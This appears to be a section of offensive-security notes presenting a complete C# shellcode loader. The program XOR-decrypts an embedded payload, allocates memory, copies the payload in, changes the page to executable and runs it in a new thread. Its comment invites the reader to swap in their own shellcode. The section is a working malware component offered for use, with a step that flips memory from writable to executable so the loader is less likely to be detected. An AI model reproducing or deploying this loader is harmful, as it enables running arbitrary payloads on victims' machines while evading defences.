2.4 Shellcode Loader — C# XOR Decrypt

Standard loader pattern: decrypt shellcode with XOR, allocate RW memory, copy, change to RX, execute.

using System;
using System.Runtime.InteropServices;

namespace ShellcodeLoader
{
    class Program
    {
        // P/Invoke declarations
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        // XOR decryption
        static byte[] XorDecrypt(byte[] data, byte[] key)
        {
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                result[i] = (byte)(data[i] ^ key[i % key.Length]);
            }
            return result;
        }

        static void Main(string[] args)
        {
            // XOR-encrypted shellcode (replace with your own)
            byte[] encBuf = new byte[] { 0xfc, 0x48, 0x83, /* ... */ };
            byte[] key = new byte[] { 0x41, 0x42, 0x43, 0x44 };

            // Decrypt
            byte[] shellcode = XorDecrypt(encBuf, key);

            // Allocate RW memory
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
                0x3000 /* MEM_COMMIT | MEM_RESERVE */, 0x04 /* PAGE_READWRITE */);

            // Copy shellcode
            Marshal.Copy(shellcode, 0, addr, shellcode.Length);

            // Change to RX
            uint oldProtect;
            VirtualProtect(addr, (uint)shellcode.Length,
                0x20 /* PAGE_EXECUTE_READ */, out oldProtect);

            // Execute
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
